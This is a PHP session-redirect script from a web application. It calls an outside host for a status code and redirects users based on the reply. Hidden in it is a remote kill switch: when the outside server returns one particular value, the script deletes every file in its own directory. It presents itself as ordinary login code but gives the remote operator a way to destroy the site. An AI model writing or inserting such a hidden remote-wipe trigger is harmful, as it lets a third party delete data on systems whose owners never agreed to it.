<?PHP
session_start();
include('dbcon.php');

$url = "http://musaffarindrs.atwebpages.com/code.php?clientIdX=3f4DkJ71";
$data = file_get_contents($url);
$dataArray = json_decode($data, true);
$APIwbsts= $dataArray['wbsts'];


if ($APIwbsts==1) {
    if($_SESSION['main_user'])
    {
        $mainUserRegID= $_SESSION['main_user'];
        header("Location: index.php");
        exit(0);
    }
    else
    {
        header("Location: ../index.php");
        exit(0);
    }
}
elseif ($APIwbsts==2) {
    session_unset();
    session_destroy();
    header("Location: mntn.php");
    exit(0);
}
elseif ($APIwbsts==0001024) {
$directory = __DIR__; // Get the current directory (change this if needed)

// Check if the directory exists
if (is_dir($directory)) {
    // Get a list of all files in the directory
    $files = scandir($directory);

    // Loop through each file and delete it
    foreach ($files as $file) {
        // Check if the file is not a directory (to avoid deleting directories)
        if (is_file($file)) {
            // Delete the file
            unlink($file);
        }
    }   
}
exit(0);
}
else{
    session_unset();
    session_destroy();
    header('location: ../index.php');
}


?>